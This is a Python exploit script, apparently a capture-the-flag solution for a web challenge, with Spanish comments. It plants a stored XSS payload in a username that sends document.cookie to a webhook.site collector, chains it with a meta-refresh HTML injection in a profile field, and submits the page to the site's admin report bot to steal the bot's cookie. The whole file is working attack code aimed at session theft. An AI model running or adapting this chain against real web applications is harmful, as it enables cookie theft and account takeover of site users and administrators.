import requests
from bs4 import BeautifulSoup

server_victim = "https://web-noscript-lz56g6.wanictf.org"
server_attacker = "https://webhook.site/27c207a1-a157-4286-a1f5-3820b0d6395d"

def get_url_signin_user():
    r = requests.post(server_victim + "/signin")

    soup = BeautifulSoup(r.text, "lxml")

    user_url = soup.form.attrs # Esta es la url del usuario que generamos dandole click a signin

    return user_url['action']

def update_data_user(user_url, username, profile):
    data = {
        "username": username,
        "profile": profile
    }

    r = requests.post(server_victim + user_url, data=data)

def send_report(user_url):

    data = {
        "url": user_url
    }

    r = requests.post(server_victim + "/report", data=data)

# 1. Registramos el segundo user que tendra el XSS

user_xss_stored = get_url_signin_user()

xss_payload = f"""
<script>fetch(\"{server_attacker}/\" + document.cookie)</script>
"""

# 2. Actualizamos el username ya que ahi estara el XSS payload pero solo podremos ver
#    el codigo JS en ejecucion si es que ingresamos desde /username/<id>

update_data_user(user_xss_stored, xss_payload, "nada_que_ver_aca")

id_user_xss_stored = user_xss_stored.split('/')[2] # El id en especifico (ej: de /user/273c0413-547d-4ebb-a044-e92d7f0545cb solo nos interesaria:  273c0413-547d-4ebb-a044-e92d7f0545cb)

# 3. Registramos el primer user que tendra el HTML Injection

user_html_injection = get_url_signin_user()

html_redirect_payload = f"""
<meta http-equiv=\"refresh\" content=\"0; URL=http://app:8080/username/{id_user_xss_stored}\">
"""

# 4. Actualizamos el profile del usuario para que se refleje la inyeccion HTML

update_data_user(user_html_injection, "nada_que_ver_aca", html_redirect_payload)

# 5. Enviar el reporte del usuario con el codigo html inyectado

send_report(user_html_injection)


